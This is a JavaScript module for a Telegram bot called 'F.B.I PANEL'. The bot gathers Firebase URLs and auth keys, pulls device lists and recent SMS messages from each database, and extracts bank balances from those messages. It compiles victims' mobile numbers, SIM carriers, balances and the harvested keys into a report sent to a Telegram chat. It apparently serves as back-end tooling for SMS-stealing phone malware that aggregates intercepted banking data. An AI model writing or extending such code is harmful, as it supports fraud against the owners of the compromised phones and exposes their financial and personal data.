'use strict';

var bank = require('./bank-balance');
var fbDev = require('./firebase-dev');

function fmtBal(n){ return '\u20B9' + Number(n).toLocaleString('en-IN', { maximumFractionDigits: 2 }); }

function createBackupRunner(api){
  var backupRunning = false;

  async function fetchFirebaseDetails(fbUrl, fbKey, fbLabel){
    var info = { url: fbUrl, key: fbKey || '', label: fbLabel || '', status: 'ok', error: '', deviceCount: 0, online: 0, offline: 0, devices: [] };
    try{
      var auth = fbKey ? '?auth=' + fbKey : '';
      var r = await fetch(fbUrl + '/clients.json' + auth);
      if(!r.ok){ info.status = 'error'; info.error = 'HTTP ' + r.status; return info; }
      var clients = await r.json();
      if(!clients || typeof clients !== 'object' || Array.isArray(clients)){ info.status = 'empty'; return info; }
      var devs = fbDev.parseDevs(clients);
      var BATCH = 15;
      for(var i=0; i<devs.length; i+=BATCH){
        await Promise.allSettled(devs.slice(i, i+BATCH).map(async function(dev){
          try{
            var mAuth = fbKey ? '?auth=' + fbKey + '&' : '?';
            var mr = await fetch(fbUrl + '/messages/' + dev.id + '.json' + mAuth + 'orderBy="$key"&limitToLast=30');
            if(!mr.ok) return;
            var bal = bank.extractLastBalance(bank.parseMsgs(await mr.json()));
            if(bal){ dev.balance = bal.amount; dev.balanceBank = bal.bank; }
          }catch(e){}
        }));
      }
      var withBal = devs.filter(function(d){ return d.balance; });
      withBal.forEach(function(d){ if(d.status) info.online++; else info.offline++; });
      info.deviceCount = withBal.length;
      info.devices = withBal;
    }catch(e){ info.status = 'error'; info.error = e.message || 'Fetch failed'; }
    return info;
  }

  function buildBackupText(data){
    var L = [], W = 62;
    function line(t){ L.push(t); }
    function blank(){ L.push(''); }
    var sep = '━'.repeat(W);
    var dsep = '═'.repeat(W);

    line(dsep);
    line('  📦  F.B.I PANEL — BACKUP REPORT');
    line('  🕐  Generated : ' + data.generatedAt.toLocaleString());
    line('  📋  Mode      : ' + (data.mode === 'new' ? 'NEW firebases only' : 'FULL database'));
    line(dsep);
    blank();
    line('📊  SUMMARY');
    line(sep);
    line('  👥  Total Users     : ' + data.totalUsers);
    line('  🔥  Total Firebases : ' + data.totalFirebases);
    line('  📱  Total Devices   : ' + data.totalDevices);
    line('  🟢  Online          : ' + data.totalOnline);
    line('  🔴  Offline         : ' + data.totalOffline);
    line('  💰  Total Balance   : ' + fmtBal(data.totalBalance));
    blank();

    if(!data.users.length){ line('⚠  No users with firebases pending'); return L.join('\n'); }

    data.users.forEach(function(u, uIdx){
      line(dsep);
      line('👤  USER #' + (uIdx + 1));
      line(dsep);
      line('  🆔  User ID   : ' + u.id);
      line('  📛  Name      : ' + (u.name || '(no name)'));
      if(u.username) line('  🔗  Username  : @' + u.username);
      line('  🔥  Firebases : ' + u.firebases.length);
      blank();

      u.firebases.forEach(function(fb, fbIdx){
        line('  🔥  FIREBASE #' + (fbIdx + 1) + (fb.label ? ' — ' + fb.label : ''));
        line('    🔗 URL      : ' + fb.url);
        if(fb.key) line('    🔑 Auth Key : ' + fb.key);
        line('    📊 Devices  : ' + fb.deviceCount + '  (' + fb.online + ' 🟢 · ' + fb.offline + ' 🔴)');
        if(fb.status === 'error'){ line('    ❌ ERROR    : ' + fb.error); blank(); return; }
        if(!fb.devices.length){ line('    ⚠ No balance devices found'); blank(); return; }
        fb.devices.forEach(function(d, dIdx){
          line('    📱 #' + (dIdx + 1) + '  ' + (d.status ? '🟢' : '🔴') + '  ' + (d.name || 'Unknown'));
          if(d.mobNo && d.mobNo !== '—') line('         Mobile  : ' + d.mobNo);
          if(!isNaN(d.batteryNum)) line('         Battery : ' + d.batteryNum + '%');
          var carriers = fbDev.devCarrierList(d);
          if(carriers.length) line('         SIMs    : ' + carriers.join(', '));
          if(d.balance) line('         💰 Bal  : ' + fmtBal(d.balance) + (d.balanceBank ? '  ·  ' + d.balanceBank : ''));
          if(d.note) line('         📝 Note : ' + d.note);
          line('         ID      : ' + d.id);
          blank();
        });
      });
    });

    line(dsep);
    line('  ✅  End of report');
    line(dsep);
    return L.join('\n');
  }

  async function collectUsersBackup(onlyNew, actorUid){
    var sentSet = {};
    if(onlyNew){
      var arr = await api.redisSMembers(api.RK_SENT, actorUid);
      for(var x=0; x<(arr || []).length; x++) sentSet[arr[x]] = true;
    }
    var uids = await api.redisSMembers(api.RK_USERSET, actorUid);
    var result = { generatedAt: new Date(), mode: onlyNew ? 'new' : 'full', totalUsers: 0, totalFirebases: 0, totalDevices: 0, totalOnline: 0, totalOffline: 0, totalBalance: 0, users: [] };
    var newUrls = [];
    var clearedUids = [];

    for(var i=0; i<uids.length; i++){
      var uid = uids[i];
      var slotKey = api.RK_PREFIX + uid;
      var encData = await api.redisGet(slotKey, actorUid);
      if(!encData) continue;
      var fbs = [];
      try{ fbs = JSON.parse(encData) || []; }catch(e){ fbs = []; }
      if(!fbs.length) continue;

      var prof = api.getUserProfile ? await api.getUserProfile(uid) : null;
      var userEntry = {
        id: uid,
        name: prof ? [(prof.first_name || ''), (prof.last_name || '')].filter(Boolean).join(' ') : '',
        username: prof ? (prof.username || '') : '',
        firebases: []
      };

      var userHadContent = false;
      for(var j=0; j<fbs.length; j++){
        var fb = fbs[j];
        if(onlyNew && sentSet[fb.u]) continue;
        var fbInfo = await fetchFirebaseDetails(fb.u, fb.k || '', fb.l || '');
        userEntry.firebases.push(fbInfo);
        result.totalFirebases++;
        result.totalDevices += fbInfo.deviceCount;
        result.totalOnline += fbInfo.online;
        result.totalOffline += fbInfo.offline;
        fbInfo.devices.forEach(function(d){ if(d.balance) result.totalBalance += d.balance; });
        newUrls.push(fb.u);
        userHadContent = true;
      }
      if(userEntry.firebases.length){ result.users.push(userEntry); result.totalUsers++; }
      if(userHadContent) clearedUids.push({ uid: uid, slotKey: slotKey });
    }
    return { result: result, newUrls: newUrls, clearedUids: clearedUids };
  }

  async function clearUserSlots(clearedUids, actorUid){
    for(var i=0; i<clearedUids.length; i++){
      try{
        await api.redisDel(clearedUids[i].slotKey, actorUid);
        await api.redisSRem(api.RK_USERSET, clearedUids[i].uid, actorUid);
      }catch(e){}
    }
  }

  async function run(chatId, actorUid, onlyNew){
    if(backupRunning) return;
    backupRunning = true;
    try{
      await api.tgSend(chatId, onlyNew ? '⏳ <b>Collecting NEW firebases…</b>' : '⏳ <b>Collecting full database…</b>');
      var r = await collectUsersBackup(onlyNew, actorUid);
      var data = r.result;
      if(!data.totalFirebases){
        await api.tgSend(chatId, onlyNew ? '✅ <b>No new firebases</b>' : '✅ <b>No firebases pending</b>');
        return;
      }
      var report = buildBackupText(data);
      var sizeKB = (Buffer.byteLength(report, 'utf8') / 1024).toFixed(1);
      var caption = (onlyNew ? '📦 <b>F.B.I — NEW Firebases</b>' : '📦 <b>F.B.I — FULL DB REPORT</b>')
        + '\n📅 ' + new Date().toLocaleString()
        + '\n\n👥 Users: ' + data.totalUsers + '\n🔥 Firebases: ' + data.totalFirebases
        + '\n📱 Devices: ' + data.totalDevices + '\n💰 Balance: ' + fmtBal(data.totalBalance)
        + '\n💽 Size: ' + sizeKB + ' KB';
      var fname = (onlyNew ? 'FBI-NEW-DB-' : 'FBI-FULL-DB-') + new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19) + '.txt';
      var res = await api.tgSendDocument(chatId, report, fname, caption);
      if(res && res.ok){
        if(onlyNew){
          for(var i=0; i<r.newUrls.length; i++){
            try{ await api.redisSAdd(api.RK_SENT, r.newUrls[i], actorUid); }catch(e){}
          }
        }
        await clearUserSlots(r.clearedUids, actorUid);
      } else {
        await api.tgSend(chatId, '❌ Failed: ' + ((res && res.description) || '?'));
      }
    }catch(e){
      await api.tgSend(chatId, '❌ ' + e.message);
    }finally{
      backupRunning = false;
    }
  }

  return {
    runBackupFull: function(chatId, actorUid){ return run(chatId, actorUid, false); },
    runBackupNew: function(chatId, actorUid){ return run(chatId, actorUid, true); }
  };
}

module.exports = { createBackupRunner: createBackupRunner };
